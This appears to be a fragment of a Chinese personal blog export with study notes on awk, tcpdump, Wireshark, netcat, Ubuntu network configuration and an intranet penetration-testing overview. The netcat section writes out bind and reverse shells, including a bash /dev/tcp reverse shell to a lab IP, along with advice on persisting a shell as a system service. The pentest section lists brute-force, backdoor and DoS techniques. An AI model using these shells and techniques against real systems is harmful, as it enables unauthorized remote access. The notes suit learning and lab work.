'/22/\Mar\/2019/&#123;ips[$1]++&#125; END&#123;for(i in ips)&#123;if(ips[i]&gt;100)&#123;print i, ips[i]&#125;&#125;&#125;' | # &gt;100的才打印awk '$2&gt;100' |sort -k2 -rn | head #【思路】 将要统计的字段作为数组的索引### awk函数# 统计用户名为4个字符的用户awk -F: '$1~/^....$/&#123;count++;print $1&#125; END&#123;print "count is:" count&#125;' /etc/passwd# lengthawk -F: 'length($1)==4&#123;count++;print $1&#125; END&#123;print "count is:" count&#125;' /etc/passwd ### awk自定义变量(外部变量)# 1.再双引号里面var=bashecho "unix script" |awk "gsub(/unix/, \"$var\")" # 转义双引号，里面是$变量# 2.两个双引号里面套个单引号echo "unix script" |awk 'gsub(/unix/, "'"$var\"'")'#df -h |awk '&#123; if(int($5)&gt;10)&#123;print $6":"$5&#125; &#125;'# 再函数外面单引号情况下i=10df -h |awk '&#123; if(int($5)&gt;'''$i''')&#123;print $6":"$5&#125; &#125;'# 3.建议： -vawk -v user=root -F:'$1 == user' /etc/passwd # 在-v的时候定义变量user=rootvar=bashecho "unix script" |awk "gsub(/unix/, var)" # 前面造一条命令，传给bash执行arp -n |awk '/^[0-9]/&#123;print "arp -d $1"&#125;' |bash 实例实践中再写….. 附其他参考文章： https://blog.csdn.net/u011436427/article/details/103815680 https://mp.weixin.qq.com/s/dXLlFgQS_3KHm8YRyDC7ZQ]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>Shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[工具 - tcpdump使用&过程文档记录]]></title>
    <url>%2F%E5%B7%A5%E5%85%B7-tcpdump%E4%BD%BF%E7%94%A8%26%E8%BF%87%E7%A8%8B%E6%96%87%E6%A1%A3%E8%AE%B0%E5%BD%95%2F</url>
    <content type="text"><![CDATA[工具-tcpdump使用 No_GUI的抓包分析工具 Linux、Unix系统默认安装 抓包默认只抓68个字节12345#参数: -i网卡 -s 抓包大小 -w保存到文件tcpdump -i ens33 -s 0 -w file.pcap#抓取指定端口的流量tcpdump -i ens33 port 22 读取抓包文件123456#查看保存到文件中的数据包tcpdump -r file.pcap#参数： -A 以ascii码形式显示内容tcpdump -A -r file.pcap#参数： -X 以16进制形式显示内容tcpdump -X -r file.pcap 显示筛选器1234567891011121314151617181920#利用OS自带的管道#参数： -n 以ip地址显示，不显示域名； 显示第三列(ip+端口)并去重tcpdump -n -r file.pcap | awk '&#123;print $3&#125;' | sort -u#tcpdump自身的显示筛选： 只显示源地址为这个的tcpdump -n -src host 192.168.0.1 -r file.pcap#只显示目的地址为这个的tcpdump -n -dst host 192.168.0.130 -r file.pcap#按端口号筛选tcpdump -n port 53 -r file.pcap#显示udp的53端口tcpdump -n udp port 53 -r file.pcap#显示tcp的tcpdump -n tcp port 80 -r file.pcap#显示icmp的tcpdump -n icmp -r file.pcap#显示ip的tcpdump -n ip -r file.pcap#-X以16进制显示tcpdump -nX port 80 -r file.pcap 高级筛选TCP的包头：可以看到上图中Flag中的标志位tcpdump可以对如此细致的东西进行筛选 12#只显示第13号字节中值转换为10进制为24(push+ack)的数据包tcpdump -A -n 'tcp[13]24' -r file.cap PS: nc、Wireshark、tcpdump必须非常熟练地掌握 过程文档记录工具 介绍几个kali中自带的 1.Dradis基于web的工具 短期临时小团队资源共享 各种插件导入文件（兼容很多种扫描器日志的导入） 使用：webapp初始化后，输入密码即可登录导入导出(支持不同文件格式)扫描器日志（具体自己操作一下就知道了） 2.Keepnote层级化记录信息：不同项目可以使用不同文件夹，子文件可以导出 3.Truecrypt一款加密工具2014年停止更新（官方原因是安全性不够，但实际使用却依然较安全） 选择加密区域：1.创建加密文件（create volume）2.创建卷(全盘加密) 选择加密方式1.标准加密卷：2.隐藏加密卷： 若被人强迫输入加密密码，可以输入一个密码打开后什么都没有(outer volume), 而重要信息存在一块隐藏空间(hidden volume)里面。hidden volume大小不能超过outer volume。【首先指定外部卷(迷惑别人的)的大小(尽量大一些,包括内部卷的大小)和密码, 内部机密卷存在于外部卷的空间中(设置它的大小和密码)】 选择加密算法（也可以多种加密算法叠加用）设置密码指定卷格式生成随机key(用鼠标再屏幕上乱滑,划得月乱，key越复杂) 使用：选择挂载的文件，就像挂载一块硬盘分区一样使用完成后：dismount或dismount all就行 对于隐藏加密卷: 输入外部卷的密码就是外部卷的内容(存储大小也隐藏了另一部分)，输入内部卷的密码打开的就是内部卷的内容]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>tcpdump</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[工具 - Wireshark使用]]></title>
    <url>%2F%E5%B7%A5%E5%85%B7-Wireshark%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[Wireshark简介 抓包嗅探协议分析 安全专家必备技能 抓包引擎(wireshark本身是分析数据包, 抓包靠下面两个引擎) Linux上： Libpcap Windows上： Winpcap 解码能力（衡量抓包软件好坏的重要标准） 基本使用方法启动捕获-&gt;选项-&gt; … …选择抓包网卡 混杂模式勾选上之后，如果数据包不是发送给我指定这个网卡的，也会被抓取 抓包筛选器指定抓什么包，不抓什么包 实时抓包就是主界面 保存和分析捕获文件先停止，再保存(可以选择格式, 尽量使用.pcap格式)，压缩等, 下次可以导入已经抓取的数据包文件 首选项编辑-&gt;首选项 -&gt; 可以自己根据需要修改和定制界面布局 筛选器 过滤干扰的数据包 抓包筛选器(捕获, 选项里面那个) 显示筛选器(主界面那个, 更多使用) – 常用语法 可以单独选择，也可以叠加(and, or)上面的条件进行筛选： 常见协议数据包数据包的分层结构显示 ARP IPProtocol字段： 表示上层是： udp–&gt; 17， tcp–&gt; 6, icmp –&gt;2, igmp –&gt;2四层有好多中协议对应不同的数字Header checksum字段：校验和, 每两位进行异或tcp和udp一般不会有option字段（视情况而定） TCP 附：三次握手 四次挥手 UDP udp和tcp的类似，自己实践能看懂udp开销更小 DNS 应用层协议，基于udp HTTP ftp 这里没ftp服务器就先不放图了ftp也是一个应用层协议 wishark默认是用端口区分协议(假设我们手动把http不开在80端口，wireshark分不清非标准端口的, 需要我们手动修改.如下图.) 数据流比如访问一个网页, 往往产生很多数据包wireshark提供了数据流 http smtp pop3 ssl 等 操作(以http为例)：按照上图操作完后，会来到数据流的界面，如下： 信息统计1.查看导入数据包文件摘要信息导入数据包文件，打开“统计”-&gt;“文件属性”：可以看到一些摘要性的信息 2.节点数打开“统计”-&gt;“endpoint”： 可以以ip地址区分/udp有多少/二层的包头/其他标准区分 节点的个数等Tx表示发送, Rx表示接收的数据包 3.协议分布打开“统计”-&gt;“协议分级”：可以看到每个协议里面什么协议的占用百分比(DNS流量占用一般都很小,否则很有可能出现异常) 4.包大小分布打开“统计”-&gt;“分组长度”：可以看到大包多还是小包多 5.会话连接打开“统计”-&gt;“conversations”：可以看到哪两台机器之间数据包会话传送最多啥的 6.解码方式对于非默认端口的数据包，wiresharl只会按端口区分的右键, 手动decode为指定的协议， 这样wireshark就会按正确的协议来解析 需要熟悉不同协议数据包的内容, 防止手动解析错误 7.专家系统“分析” -&gt; “专家系统”: 可能自动给我们一些提示 思路：如果很多个数据包，先从统计信息入手，分析出重点，找出方向。然后筛选出来，逐步分析包的内容 实践 抓包对比nc、ncta加密与不加密的流量 企业抓包部署方案 (Wiershark也有不足，大型网络还是需要商业化的软件) Sniffer Cace / riverbed （大部分还是基于wireshark进行了二次开发，改名了应该, 如果需要去网上找吧） Cascad pilot]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>Wireshark</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[工具 - netcat使用]]></title>
    <url>%2F%E5%B7%A5%E5%85%B7-netcat%E4%BD%BF%E7%94%A8%2F</url>
    <content type="text"><![CDATA[netcat使用简介 侦听模式/传输模式 可以替代telent / 获取banner信息 传输文本信息 传输文件/目录 加密传输文件 远程控制/木马 加密所有流量 流媒体服务器 远程克隆硬盘 基本用法1. 实现telnet / banner123456789# 题外话:追踪路由mtr 114.114.114.114 ## nc作为客户端：# 参数 -v 显示详细信息 # 参数 -n 如果是域名,不进行域名解析(建议直接跟ip地址)nc -nv 1.1.1.1 110 # 连接pop3服务器，可以看到banner信息（可以进行user登录[base64编码],输入指令）nc -nv 1.1.1.1 25 # smtp服务器nc -nv 1.1.1.1 80 # 探测80端口(都可进行交互的命令) 2.传输文本信息12345# 可以做聊天用# 一台作为服务端 -l 监听, -p 端口nc -l -p 4444# 另一台作为客户端去连接服务端nc -nv 1.1.1.1 4444 用途：远程电子取证 (原则:尽可能少修改被审计系统的状态，避免影响证据)就可以用nc来操作:我的电脑: nc -l -p 3333 监听被审计系统:ls -l | nc -nv 1.1.1.1 3333 输出到我的电脑 我的电脑: nc -l -p 3333 &gt; ps.txt 输出结果重定向到文件被审计系统:ps -ef | nc -nv 1.1.1.1 3333 -q 1 参数-q: 输出完成之后过1秒就断开 题外话：lsof 查看已经打开的文件 3.传输文件/目录传输文件123456# 客户端向服务端传输 （正向） A： nc-lp 3333 &gt; 1.mp4B: nc -nv 1.1.1.1 3333 &lt; 1.mp4 -q 1# 或者, 服务端向客户端传输文件 （反向）A: nc -q 1 -lp 3333 &lt; a.mp4B: nc -nv 1.1.1.1 3333 &gt; 2.mp4 传输目录123# 正向(服务端先打包再传给客户端,注意小横线别遗漏)A: tar -cvf - music/ | nc -lp 3333 -q 1B: nc -nv 1.1.1.1 3333 | tar -xvf - # 先接收再解包 加密传文件1234A： nc -lp 3333 | mcrypt --flush -Fbqd -a rijndael-256-m ecb &gt; 1.mp4 # 接收，解密B： mcrypt --fulsh -Fbq -a rijndael-256-m ecb &lt; a.mp4 | nc 1.1.1.1 3333 -q 1 # 加密，传送# 需要输入加密秘钥，解密秘钥# 不是nc的加密功能，是操作系统的加密命令，可以自行安装 4.流媒体1234#把视频流输出到B端A: cat 1.mp4 | nc -lp 3333B: nc -nv 1.1.1.1 3333 | mplayer -vo x11 -cache 3000 -#接收视频流，输出给指定播放器和缓存进行播放 5.端口扫描 以客户端角色12345#并非擅长端口扫描#参数 -z 扫描参数，只判断是否开放（默认tcp）nc -nvz 1.1.1.1 1-65535#参数 -u 扫描udp服务的端口 （不太准确）nc -nvzu 1.1.1.1 1-1024 6.远程克隆硬盘远程电子取证，可以将目标服务器硬盘远程复制(块级别的备份,磁盘磁道的状态原原本本的复制)，或者内存(内存中运行的病毒进程)12A: nc -lp 3333 | dd of=/dev/sdaB: dd -if=/dev/sda | nc -nv 1.1.1.1 3333 -q 1 7.远程控制参数: -c正向： 目标机器作为服务端监听, 把bash传给我12A: nc -lp 3333 -c bash #目标机器B: nc 1.1.1.1 3333 反向： 我的机器作为服务端, 让目标机器作为客户端主动连接我(客户端把bash传给服务器端)123456A: nc -lvp 3333 B: nc 1.1.1.1 3333 -c bash #目标机器#假如nc不支持-c 或者 -e 参数（openbsd netcat）,我们仍然能够创建远程shell目标机器： bash -i &gt;&amp; /dev/tcp/192.168.41.133/2223 0&gt;&amp;1攻击方： nc -lvvp 2223 Note: Windows用户把bash改为cmd 反向连接用的多， 因为好多都限制进入的流量而不太多限制出去的流量(根据他允许的端口调整,比如dns) 长久维持会话： 写成脚本作为系统服务，让目标机器已启动就连接我 ncat 命令 nc缺陷： nc缺乏加密能力：是数据是明文传输（容易被别人嗅探） 缺乏身份验证能力：端口如果一直向外开放，容易被他人连接窃取当做肉鸡 不同系统/平台的nc参数功能不尽相同（自己 -h 查看帮助文档和测试） ncat 命令是包含在nmap工具包中里面的一个东西(弥补了nc缺乏加密和身份验证的不足) 正向连接：1234#先进行了秘钥交换和加密#被控端(服务器端) -allow允许连接的ip， 端口, ssl加密A: ncat -c bash -allow 192.168.1.20 -vnl 3333 --sslB: ncat -nv 192.168.1.19 3333 --ssl #攻击端 其他… …]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>渗透测试</tag>
        <tag>nc</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ubuntu server-网络相关知识]]></title>
    <url>%2Fubuntu%20server-%E7%BD%91%E7%BB%9C%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%2F</url>
    <content type="text"><![CDATA[网络原理 ping 127.0.0.1 如果能通，说明本机的TCP/IP协议已经配置成功啦arping 网卡配置网卡接口-enp2s0 (最近使用)、eth0 （以前这么使用） 1234567891011121314#wl 开头的是无线网卡# ifconfig 命令# 查看所有网卡ifconfig -a 字段意义：MTU,发包，收包，`collisions`发生多少次冲突# ip 命令 ip link # 查看所有网卡和信息 ip address# lshw 查看系统硬件命令# 只查看网卡的命令sudo lshw -class network 管理网卡12345# 查看网卡参数sud ethtool enp0s3# -s 配置 ： speed 速度 半双工 sud ethtool -s duplex half | full speed 1000 网络基本设置12345678910111213141516171819202122232425## 临时设置IP地址sudo ifconfig eth0 10.0.0.00 netmask 255.255.255.0# 24位掩码sudo ifconfig eth0 10.0.0.100/24# 设置网关 gwsudo route add default gw 10.0.0.1 eth0# 网段路由 add-net （静态路由：去哪个网段，应该怎么转发）sudo route add-net 0.0.0.0 netmask 0.0.0.0 gw 1.1.1.1# 主机路由 add-host sudo route add-host 2.2.2.2 gw 1.1.1.1# 清除网卡配置ip addr fulsh eth0# 向网络中要一个IPsudo dhcpclient# 禁用网卡sudo ifconfig eth0 down# 启用网卡sudo ifconfig eth0 up# 重启网络服务sudo systemctrl restart networking.service 网卡配置文件/etc/nwtwork/interfaces12345678文件字段：iface 网卡name inet 网络配置（loopback/dhcp/static） sudo eth0 iface eth0 inet static|DHCP # pre-up 系统启动中(网卡运行前) 设置为1000M，全双工 pre-up/sbin/ethtool -s eth0 speed 1000 duplex full 动态获取IP地址123# sudo vim /etc/network/interfacesauto eth0iface inet dhcp 静态IP地址一般服务器是静态的IP1234567891011121314151617# sudo vim /etc/network/interfacesauto eth0iface inet static address 192.168.123.9 netmask 255.255.255.0 # 掩码 gateway 192.168.123.1 # 网关 dns-nameservers 192.168.123.1 202.99.96.68 # 一般dns地址写俩 # 上面是基本配置, 下面是额外其他配置项 broadcast 192.168.123.255 # 网段的广播地址 # dns-search abc.com # 如果属于某个dns域,就默认去找这个 up route add -net 172.16.0.0/24 gw 192.168.23.1 eth0 # 开机之后,添加一个网段(要指定具体网关) mtu 1460 # 指定MTU 字节 # hwaddress 00:11:22:33:44:55 # 指定硬件mac地址 # 刷新,重启网络, 配置文件的网络生效(实在不行就重启计算机)sudo ip address fulsh eth0 sudo systemctrl restart networking.service 指定路由清除信息ip addr flush ens32 Note： VmWare对网络的支持要好于VirtualBox(比如有些网络的配置可能有限制) DNS配置DNS配置文件/etc/resolve.conf 123456/etc/resolve.conf # DNS设置（软连接）格式: nameserver 114.114.114.114 nameserver 127.0.0.53 options edns0 search www.tendawifi.com 主机名解析1.配置文件 /etc/hosts 优先级别高于resolve.conf里面的dns服务器的信息1234# ip 和名称做解析127.0.0.1 localhost192.168.0.111 www.qq.com# 现在这里找映射，有的话就不去resolve里面找了 2.配置文件 /etc/nsswitch.conf 名称解析顺序配置文件123456789# 按照优先级先后排序来解析 （前面的不满足，才调用后面的）- files /etc/hosts- Resolve 全称systemd-resolved.service(缓存、localhost、本机名) （默认安装）- [NOTFOUND=return] 结果即权威 （正则表达式） （当找不给我到的之后，返回）- dns dns服务器（resolve文件配置的那些）- mdns4_minimal MulticastDNS(多播dns服务) 现在很多dns厂家用的就是多播dns服务# hosts: files mdns4_minimal [NOTFOUND=return] dns myhostname 关于解析优先级：有的攻击者会修改你hosts文件映射到自己的恶意网址，此时如果把dns的顺序放到hosts前面，他就利用不成了 查看路由1234# 路由信息route -nnetstat -nr 网桥配置 把服务器当交换机用实在是大材小用把多个以太网段以上层透明的方式连接在一起 应用场景：1.可做防火墙2.可以做虚拟机的服务器（搭建云平台，进行虚拟化的时候）3.桥接有线网与无线网（比如我的笔记本：连接网线访问互联网，另外让别人通过我的电脑无线上网，相当于一个AP）4.链路荣誉容错（需启用STP）5.通过网桥管理工具实现 bridge-utils 在ubunut搭建网桥在虚拟机添加2块网卡(一块NAT，另一块随便) 安装网桥管理包：sudo apt install bridge-utils 临时配置网桥：命令： btctl12345678sudo btctl addr br0 # 添加一个网桥的网卡接口sudo btctl addif br0 eth0 eth1 # 往网桥接口添加2块网卡# sudo ifconfig eth0 down # 把网卡down掉sudo ifconfig eth0 0.0.0.0 up # 2者的ip变没了sudo ifconfig eth1 0.0.0.0 upsudo ifconfig br0 1.1.1.1/24 up # 手动配置网桥网卡的ip并upsudo dhclient br0 # 或者 dhcp自动获取网桥网卡的ip地址sudo route add default gw 1.1.1.10 # 添加一个网关，就可以访问外网了 持久配置网桥：修改配置文件： /etc/network/interfaces12345678910auto eth0iface eth0 inet manualauto eth1iface eth1 inet manualauto br0iface br0 inet dhcp # dncp ， 也可以static，下面手动配置address，netmask和gatewaybridge_ports eth0 eth1 # 加入网卡bridge_stop off #关闭生成树 ,也可以 on开启成树，参与生成树计算 修改保存，然后 重启网络服务/重启服务器 查看网桥运行状态sudo brctl show查看mac情况sudo brctl showmacs br0查看生成树情况sudo brctl showstp br0 网卡绑定 (经常使用) 还记得小时候这段一把筷子的故事吗 实现多块网卡的绑定，实现高可用、负载均衡、更大发挥能力 一些常用称呼：Bonding == Port Trunking == Link aggregation(链路聚合) == Team 目的：将多个物理网卡组合为一个逻辑网卡 高可用、负载平衡、高吞吐量 配置：在虚拟机做实验：先给虚拟机添加至少两块网卡1.123456789sudo echo bonding &gt;&gt; /etc/modules # 添加内核支持sudo modprobe bonding # 手动加载内核(临时)， modeprobe加载bondingifconfig -a # 可以看到自动生成了一个bonding0的网卡(但是没有up)sudo systemctl stop networking # 永久配置，文件# sudo vim /etc/network/interfacesbounding # 添加一个模块# 重启服务sudo systemctl restart networking 2.配置网卡配置文件123456789101112131415161718192021# Mode 1 配置# sudo vim /etc/network/interfacesauto eth0 iface eth0 inet manualbond-master bond0 # 绑定到哪个bound上bond-primary eth0 # 默认做的主的网卡auto eth01iface eth01 inet manualbond-master bond0 # 备的网卡，协商要绑定那个auto bond0iface bond0 inet dhcp # 让ip地址dhcp； 或者static 手动制定bond-mode 1 # 绑定模式 active-backupbond-miimon 100 # 故障检测间隔： 100msbond-slaves none # 指定作为的的成员的网卡, 这里写none是因为：加入在自己物理网卡片段里面写了--# 重启服务sudo systemctl restart networking PS: 绑定模式bound-mode11 一个主，一个备(主的故障后才工作) 也叫： active-backup 6种模式Mode 0 ： round-robin(轮询) 网络流量（数据包） 顺序平均分配给Bond中所有物理网卡（可以同时使用三个网卡发送和接收数据） 高可用（容错，一个坏了，另一个网卡接管）、负载均衡（多个网卡，单独是，就是拥有了多G的带宽） Mode 1 : ative-backup Bond中只有一个网卡Active， 其他网卡全部Stanby（效率并不是很高） 对外只有一个网卡的MAC地址可见 高可用实现不了负载均衡，有多个接口也没用 Mode 2: balance-XOR 根据源目的MAC/IP/Port进行计算，确定从哪个网卡发出（性能优于Mode0） 高可用，负载均衡 （XOR — &gt; 异或）只要不出现故障，不改变mac地址，第一次使用的第一个物理网卡进行的通信，以后所有的通信都是继续使用第一个物理网卡流量不是平均的 Mode 3 broadcast 发包广播给Bond中所有网卡，提供最短的故障恢复时间，应用连接不中断 高可用 Mode 4 802.3ad（Dynamic link aggregation） 链路聚合LACP组内的网卡使用相同速率、双工设置 要求：计算机安装ethtool；交换机支持IEEE802.3ad标准，并进行额外配置 高可用、负载均衡 Mode 5 balance-tlb （Adaptive transmit load balancing） 隧道绑定不需要上连交换机额外配置，根据网卡负载出站负载均衡 高可用、负载均衡 Mode 6: balance-alb (Adaptive load balance) Mode 5 + balance-rlb (入站流量负载均衡) Bond驱动拦截本机的ARP响应包，使用不同网卡硬件MAC替换源MAC 不同的对端使用不同的服务器MAC地址，实现入站负载均衡 不需要上连交换机额外配置 查看bond端口和状态1cat /proc/net/bonding/bond0 Model 4 配置123456789101112# sudo vim /etc/network/interfacesauto eth0 # 其他物理网卡配置项同iface eth0 inet manualbond-master boud0 # 绑定到哪个bound上auto bond0iface bond0 inet dhcp # 让ip地址dhcp； 或者static 手动制定bond-mode 4 # 绑定模式 active-backupbond-miimon 100 # 故障检测间隔： 100msbond-lacp-rate 1 # 每1s发送LACPDU（默认为0，即30s）bond-slaves eth0 eth1 # 指定作为的的成员的网卡 DHCP服务通常给客户端自动分配IP地址 Dynamic Host Configuration Protocol 透明的配置网络参数 IP/掩码、网关、DNS、域名、时间服务器、打印服务器(常用的参数是前三个) 通过地址租约循环使用IP地址（有租约期，循环利用） 基于UDP， 标准使用 端口： 67(服务端)，68(客户端) ps: 一般企业，dhcp都在核心交换机上，只有当企业网络非常大复杂时候，才会单独使用一个服务器来提供dhcp服务 请求和分配步骤：1.客户端发生第一个广播(二层，因为此时还没有ip)，数据包：dhcp discover2.dhcp服务器回复数据包dhcp offer3.客户端就再发一个广播包dhcp request4.服务器端发送数据包ack， 包含ip等参数，标记这个ip为已分配 安装1.在vmware上，打开虚拟网络设置，以vmnet8为例，关闭vmware自带的dhcp服务（如果同时有两台dhcp服务:使用响应快的服务提供的ip），将这台虚拟机使用nat，让其他虚拟机都使用这台虚拟机的dhcp服务，把这个虚拟机修改为静态ip, 修改配置文件/etc/network/inertface到vmnet8的网段，sudo ip addr fulsh eth0清除原来配置，重启网络服务 2.安装dhcp服务的软件包12# 这里用的isc的sudo apt install isc-dhcp-server 3.配置dhcp服务 Note：能不安装的服务和软件就不要安装，反非必须，就不启用（缩小攻击面）12345678910111213141516171819202122232425262728##1.先修改配置文件1#sudo vim /etc/default/isc-dhcp-server # 指定启动DHCP服务的网卡 INTERFACE="eth0" # 要启动shcp的网卡name(一般是针对内网的那一块网卡)，可以多个网卡（空格隔开） ##2.再修改主配置文件（指定地址池和选项） #sudo vim /etc/dhcp/dhcpd.conf #option只对dhcp的作用域起效；其他的很对整个服务器起效#一致的配置写在文件起始位置，其他的个性的单独设置在各个网段的位置default-lease-time 600; #租约期限， 单位：smax-lease-time 7200; #最大租约期限(到达时间的一半，就刷新使用期；如果到达最大时间，就重新通过dhcp获取)authoritative; #启用之后，证明这个是权威的授权dhcp服务器（一般情况下，网络中如果出现其他的dhcp就不会影响了）#配置地址池(可以手动写，也可以在原注释的基础上配置) 网段subnet 10.1.8.0 netmask 255.255.255.0 &#123; range 10.1.8.100 10.1.8.200; #可分配的地址段 option routers 10.1.8.1; #网关地址 option domain-name-servers 192.168.1.1,192.168.1.2; #dns服务器地址，多个用逗号隔开; 一般配到这里就够了 option ntp-server 1.1.1.1; #时间服务器 option domain-name "local.lan"; #统一的域名&#125;##3.重启服务...#客户端一些操作ipconfig /allipconfig /release # 释放这个ipipconfig /renew #重新获取ip 3.特殊情况(指定某个ip只分配给某台计算机，IP保留) 通过MAC地址来识别1234567#sudo vim /etc/dhcp/dhcpd.conf host yourname &#123; hardware ethernet 00:11:22:33:44:55; fixed-address 10.1.8.8; #尽量用上面地址池以外的地址&#125;#保存，重启 日常的维护日志与状态查询12345678#服务器地址租约结果（可查看分发详细信息）cat /var/lib/dhcp/dhcpd.leases#系统日志文件(客户端直接关机不会记录，release的时候会记录)tail -f /var/log/syslog#查看服务运行状态systemctl status isc-dhcp-server.service#客户端来查看获得地址历史(客户端是Linux时)less /var/lib/dhcp/dhcpd.leases NTP服务 （网络时间协议） 时间都去哪了 时间表准： GMT：格林威治标准时间 UTC：世界协调时间 CST：China Standard Time UT+8:00 NTP协议 NTP客户端 客户端程序从时间服务器同步时间 系统启动时自动同步时间 网口激活时自动同步运行 手动同步时间 1234# 新版系统，查看客户端时间timedatectl# RTC时间：硬件时间 新版系统使用timesyncd客户端同步时间向这个域名请求：ntp.ubuntu.com 123456789101112131415timedatectrl list-timezones #列出所有时区timedatectrl set-timezone #设置时区timedatectrl set-time "2019-10-01 18:18:18" #设置系统时间timedatectl set-ntp true #开始网络同步systemctl status systemd-timesyncd.service # 查看时间服务状态# 硬件时间(RTC)与UTC时间同步sudo hwclock -w # 将系统时间写入到RTC时间sudo hwlock -s # 将硬件hwclock --set --date='2019-10-01 18:18:18'# 配置文件/etc/systemd/timesyncd.conf 一个过时的东西(ntpdate)新版本系统使用timesyncd替换ntpd的客户端功能一旦安装了ntpdate / ntp, timedatectrl将被禁用 ntpd – 客户端+服务器 把机器设置成时间服务器123456789101112apt install ntp # 安装ntp服务systemctl start ntp # 启动服务(123端口就被打开了)systemctl status ntp # 查询服务状态systemctl restart ntp # 重启服务##配置文件（我也要跟上一级的时间服务器同步）vim /etc/ntp.conf#如果不使用官方的时间服务器，可以自己指定server 1.1.1.1#首选网络时间服务器不可用的时候，使用本机始终作为备用时间源fudge 127.127.1.1 startum 10 # 层级设置低点( startum 10, 这里设置为10层) 配置文件中，主要的时间服务器如下 命令: ntpq – ntp服务端的查询命令12ntpq -p #命令执行结果详解如下图： 每行前面第一个字符含义： 123456空 表示无效主机x 已不再使用- 已不再使用# 状态良好但为使用+ 良好且优先使用* 首选主同步主机 （一般是startum层级最高的） 其他命令1234567#查看日期date#设置date --set 1998-11-11 #手动设置日期（要通过 sudo timedatectl set-ntp 0 来关掉ntp）date --set 21:21:21 #设置时间cat /etc/timezone #查看时区]]></content>
      <categories>
        <category>Linux</category>
      </categories>
      <tags>
        <tag>Linux</tag>
        <tag>ubuntu</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[内网渗透]]></title>
    <url>%2F%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%2F</url>
    <content type="text"><![CDATA[内网分类： 带域环境的内网 不带域环境的内网 一些端口文件共享服务端口渗透 比如学校机房有专门用来下载文件的服务器 ftp服务FTP服务： ftp服务我分为两种情况，第一种是使用系统软件来配置，比如IIS中的FTP文件共享或Linux中的默认服务软件；第二种是通过第三方软件来配置，比如Serv-U还有一些网上写的简易ftp服务器等；默认端口：20（数据端口）；21（控制端口）；69（tftp小型文件传输协议） 攻击方式： 爆破：ftp的爆破工具有很多：Bruter，以及msf中ftp爆破模块； 匿名访问：用户名：anonymous 密码：为空或任意邮箱 Samba服务Samba服务：对于这个可以在windows与Linux之间进行共享文件的服务同样是我们攻击的关注点；samba登录分为两种方式，一种是需要用户名口令；另一种是不需要用户名口令。在很多时候不光是pc机，还有一些服务器，网络设备都开放着此服务，方便进行文件共享，但是同时也给攻击者提供了便利。默认端口：137（主要用户NetBIOS Name Service；NetBIOS名称服务）、139（NetBIOS Session Service，主要提供samba服务） 攻击方式： 爆破：弱口令（爆破工具采用hydra）hydra -l username -P PassFile IP smb 未授权访问：给予public用户高权限 远程代码执行漏洞：CVE-2015-0240、CVE-2017-7494等等 LDAP协议ldap：轻量级目录访问协议，最近几年随着ldap的广泛使用被发现的漏洞也越来越多。但是毕竟主流的攻击方式仍旧是那些，比如注入，未授权等等；这些问题的出现也都是因为配置不当而造成的。默认端口：389 攻击方式： 注入攻击盲注 未授权访问 爆破：弱口令 远程连接服务端口渗透SSH服务SSH服务： 这个服务基本会出现在我们的Linux服务器，网络设备，安全设备等设备上，而且很多时候这个服务的配置都是默认的；对于SSH服务我们可能使用爆破攻击方式较多。默认端口： 22 攻击方式： 爆破： 弱口令 漏洞：28退格漏洞、OpenSSL漏洞 Telent服务Telnet服务：在SSH服务崛起的今天我们已经很难见到使用telnet的服务器，但是在很多设备上同样还是有这个服务的；比如cisco、华三，深信服等厂商的设备；我就有很多次通过telnet弱口令控制这些设备；默认端口： 23 攻击方式： 爆破：弱口令 嗅探：此种情况一般发生在局域网 远程桌面连接远程桌面连接：作为windows上进行远程连接的端口，很多时候我们在得到系统为windows的shell的时候我们总是希望可以登录3389实际操作对方电脑；这个时候我们一般的情况分为两种。一种是内网，需要先将目标机3389端口反弹到外网；另一种就是外网，我们可以直接访问；当然这两种情况我们利用起来可能需要很苛刻的条件，比如找到登录密码等等；默认端口： 3389 攻击方式： 爆破：3389端口爆破工具就有点多了(7kbScan-RDP-Sniper，msf的爆破模块) Shift粘滞键后门：5次shift后门 3389漏洞攻击：利用ms12-020攻击3389端口，导致服务器关机（msf的模块有检测auxiliary/scanner/rdp/ms_12_…，利用模块auxiliary/dos/windows/rdp/ms12_020_maxchannelids） VNC服务VNC服务: 一款优秀的远控工具，常用语类UNIX系统上，简单功能强大；也默认端口：5900+桌面ID（5901；5902） 攻击方式： 爆破：弱口令 认证口令绕过： 拒绝服务攻击：（CVE-2015-5239） 权限提升：（CVE-2013-6886） 第三方软件… … Web应用服务端口渗透1.中间件平台渗透12IIS Apache Nginx Weblogic tomcat Jboos Websphere等# 可使用vulhub靶场测试 `中间件漏洞集合PDF`， `未授权访问集合PDF` 2.WEB应用程序渗透 已知CMS 未知CMS 常规漏洞测试 数据库服务端口渗透针对所有的 数据库攻击方式都存在SQL注入，这里先提出来在下面就不一一写了免得大家说我占篇幅；当然不同的数据库注入技巧可能不一样，特别是NoSQL与传统的SQL数据库不太一样。但是这不是本文需要介绍的重点，后面有时间会写一篇不同数据库的渗透技巧。 MySQL数据库默认端口： 3306 攻击方式： 爆破：弱口令 身份认证漏洞：CVE-2012-2122 拒绝服务攻击：利用sql语句是服务器进行死循环打死服务器 Phpmyadmin万能密码绕过：用户名：‘localhost’@’@” 密码任意 MSSQL数据库默认端口：1433（Server 数据库服务）、1434（Monitor 数据库监控） 攻击方式： 爆破：弱口令 Oracle数据库默认端口：1521（数据库端口）、1158（Oracle EMCTL端口）、8080（Oracle XDB数据库）、210（Oracle XDB FTP服务） 攻击方式： 爆破：弱口令 漏洞攻击 